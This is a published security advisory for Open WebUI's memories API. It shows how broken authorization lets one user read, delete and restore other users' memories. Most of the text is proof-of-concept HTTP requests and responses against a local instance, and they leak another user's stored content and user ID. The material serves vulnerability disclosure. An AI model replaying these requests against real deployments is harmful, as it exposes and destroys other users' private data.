# [H] Open WebUI has inconsistent authorization controls within memories API

## Summary
Severity: High
Advisory: GHSA-hmjq-crxp-7rjw
CVE: CVE-2026-44570
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-hmjq-crxp-7rjw
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.6.19

## Details
### Summary

Authorization controls surrounding the memories API were inconsistent, resulting in the ability of a standard user to delete, restore, and view the contents of other users' memories.


### Details

Using a newly created non-admin user with no existing memories, it is possible to view existing memories via `POST /api/v1/memories/query`. See below under the PoC section, where a call to `GET /api/v1/memories/` returns `[]` (as expected) but a call to `POST /api/v1/memories/query` reveals memories created by other users.

Similarly, even if a non-admin user cannot modify another user's memory data via `POST /api/v1/memories/{memory_id}/update`, the endpoint's response improperly leaks the content of that memory if a valid memory_id is known.

The `DELETE /api/v1/memories/{memory_id}` can also be used by any user to delete an existing memory. Deleted memories can then be restored by calling the `POST /api/v1/memories/{memory_id}/update` endpoint again.

### PoC 1

**Example of a user with no memories able to query an existing memory from another user**

```
GET /api/v1/memories/ HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
Accept: application/json
Content-Type: application/json
Connection: keep-alive
Content-Length: 0

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:19:58 GMT
server: uvicorn
content-length: 2
content-type: application/json
x-process-time: 0

[]
```

```
POST /api/v1/memories/query HTTP/1.1
Host: localhost:8080
Content-Length: 19
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Content-Type: application/json
Connection: keep-alive

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:22:01 GMT
server: uvicorn
content-length: 187
content-type: application/json
x-process-time: 0
access-control-allow-origin: *
access-control-allow-credentials: true

{"ids":[["d6802d76-a50f-4255-b68e-0f60c335e043"]],"documents":[["My secret content"]],"metadatas":[[{"created_at":1752784616,"updated_at":1752864797}]],"distances":[[0.6216812525921495]]}
```

### PoC 2

**Example showing excess output about a memory a user has no access to modify**

```
POST /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043/update HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
Accept: application/json
Content-Type: application/json
Connection: keep-alive
Content-Length: 23

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 18:53:37 GMT
server: uvicorn
content-length: 172
content-type: application/json
x-process-time: 0

{"id":"d6802d76-a50f-4255-b68e-0f60c335e043","user_id":"a050e531-356b-4673-8772-ff1aecdf3273","content":"My secret content","updated_at":1752864797,"created_at":1752784616}
```

### PoC 3

**Example showing a memory being deleted then restored by a different user than its owner**

```
DELETE /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043 HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Connection: keep-alive

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:31:19 GMT
server: uvicorn
content-length: 4
content-type: application/json
x-process-time: 0

true
```

```
POST /api/v1/memories/query HTTP/1.1
Host: localhost:8080
Content-Length: 19
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Content-Type: application/json
Connection: keep-alive

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:32:31 GMT
server: uvicorn
content-length: 63
content-type: application/json
x-process-time: 0

{"ids":[[]],"documents":[[]],"metadatas":[[]],"distances":[[]]}
```

```
POST /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043/update HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
Accept: application/json
Content-Type: application/json
Connection: keep-alive
Content-Length: 23

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:33:05 GMT
server: uvicorn
content-length: 172
content-type: application/json
x-process-time: 0

{"id":"d6802d76-a50f-4255-b68e-0f60c335e043","user_id":"a050e531-356b-4673-8772-ff1aecdf3273","content":"My secret content","updated_at":1752864797,"created_at":1752784616}
```

```
POST /api/v1/memories/query HTTP/1.1
Host: localhost:8080
Content-Length: 19
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE
User-Agent: Test
accept: application/json
Content-Type: application/json
Connection: keep-alive

{
  "content": ""
}

---

HTTP/1.1 200 OK
date: Fri, 18 Jul 2025 19:33:34 GMT
server: uvicorn
content-length: 187
content-type: application/json
x-process-time: 0

{"ids":[["d6802d76-a50f-4255-b68e-0f60c335e043"]],"documents":[["My secret content"]],"metadatas":[[{"created_at":1752784616,"updated_at":1752864797}]],"distances":[[0.6216812525921495]]}
```

### Impact

Potential disclosure of sensitive data stored within a user's memories. Disclosure of unique user ID values to non-admins when viewing a memory.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-hmjq-crxp-7rjw
- https://nvd.nist.gov/vuln/detail/CVE-2026-44570
- https://github.com/open-webui/open-webui
